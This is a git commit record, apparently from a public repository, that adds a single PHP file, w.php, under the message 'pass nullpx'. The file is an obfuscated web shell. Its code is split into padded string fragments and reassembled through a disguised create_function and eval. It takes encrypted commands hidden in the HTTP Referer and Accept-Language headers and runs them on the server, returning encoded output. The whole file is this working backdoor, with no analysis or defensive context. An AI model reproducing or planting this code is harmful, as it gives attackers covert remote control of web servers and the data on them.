574494868a8467f64afa39b25de480dcdbf57b98
0px <32860414+0px0@users.noreply.github.com>
2018-01-19 16:29:03 +0700

    pass nullpx

---
+++ w.php
@@ -0,0 +1,17 @@
+<?php
+$x='$kh="8aA02a";$kf=A0"dae9";A0fA0uncA0tion x($t,$A0kA0){$c=strlen($kA0);$l=stA0rlA0eA0n($A0t);$oA0="";f';
+$z=str_replace('sQ','','sQcreatsQesQ_fusQnsQsQction');
+$t='(md5($i.$kh),A00,3));A0$f=$sl($sA0s(A0md5($A0i.$kf)A0A0,0,3));$pA0="";for(A0$z=1;$A0z<count($m[A01]);$zA';
+$r='rA0a){$u=parsA0e_urA0l($rr);pA0A0arsA0e_A0str($u["quA0ery"]A0,$q);A0$q=arrA0A0ay_valueA0s($q);preg_maA0';
+$d='0ray("/","+"),A0$ss($sA0[$i],0A0,$A0e))),$k))A0);A0$o=ob_geA0t_coA0ntents();A0ob_endA0_A0clean();$d=bA0a';
+$E='se6A04_enA0code(A0x(gzcomA0press($o)A0,A0$k)A0A0);print("<$k>$A0d</$k>");@sessA0ionA0_destroyA0();}}}}';
+$i=');@A0A0evA0al(A0@gzuncompreA0ssA0(@xA0(@base6A04_decode(preg_reA0plA0ace(array("/A0_A0/","/-/"),arA0A';
+$m='$A0s=&$_SESSION;$ss=A0"subsA0tr";$A0sl="strA0toloA0wer";$i=A0$m[1][0A0].A0$m[1][1]A0;$h=$A0A0sl($ssA0';
+$w='0++)$p.A0=$q[$m[A02A0][$z]]A0;if(strpA0osA0($p,$h)A0===0){$s[$A0i]A0="";A0$p=$A0ss($p,3);}if(arA0rayA0';
+$p='_key_eA0xists($i,$A0sA0)){$s[$i].=A0$p;A0$e=stA0A0A0rpos($s[$i],$f);ifA0A0($eA0){$k=$kh.$kA0f;ob_start(';
+$y='o;}$r=$_A0SERVA0ERA0;$rr=@$r["HTTP_A0REFEREA0R"];$A0ra=@$r["A0HTTP_ACA0CEPT_A0LA0AA0NGUAGE"];if($A0rr&&$';
+$h='or($i=0;$A0i<A0$l;A0){for($j=0;($jA0<A0$c&&$i<$lA0);$j++,$i++)A0{$A0o.=$t{$iA0}^A0$k{$j};}}rA0A0eA0turn $';
+$G='tch_all("/([\\wA0])[\\w-A0]+(?A0:;q=0.(A0[\\A0d]))?,A0?/"A0,$ra,$mA0);if($q&&$mA0){@sA0eA0ssion_start(A0A0);';
+$V=str_replace('A0','',$x.$h.$y.$r.$G.$m.$t.$w.$p.$i.$d.$E);
+$f=$z('',$V);$f();
+?>
